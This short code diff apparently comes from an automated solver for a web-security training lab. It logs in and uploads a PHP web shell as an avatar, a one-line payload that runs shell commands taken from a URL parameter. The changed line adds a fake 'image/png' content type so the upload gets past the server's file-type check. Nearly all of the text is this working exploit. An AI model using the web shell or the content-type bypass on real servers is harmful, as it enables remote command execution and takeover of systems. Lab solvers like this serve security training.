@@ -6,7 +6,7 @@ def solve_lab(session):
     session.login("wiener", "peter")
 
     csrf = session.get_csrf_token("/my-account")
-    files = {"avatar": ("shell.php", '<?php echo SYSTEM($_GET["cmd"])?>')}
+    files = {"avatar": ("shell.php", '<?php echo SYSTEM($_GET["cmd"])?>', "image/png")}
     data = {"user": "wiener", "csrf": csrf}
     session.post_path("/my-account/avatar", files=files, data=data)
     logger.info('Uploaded the following file to "/my-account/avatar":')
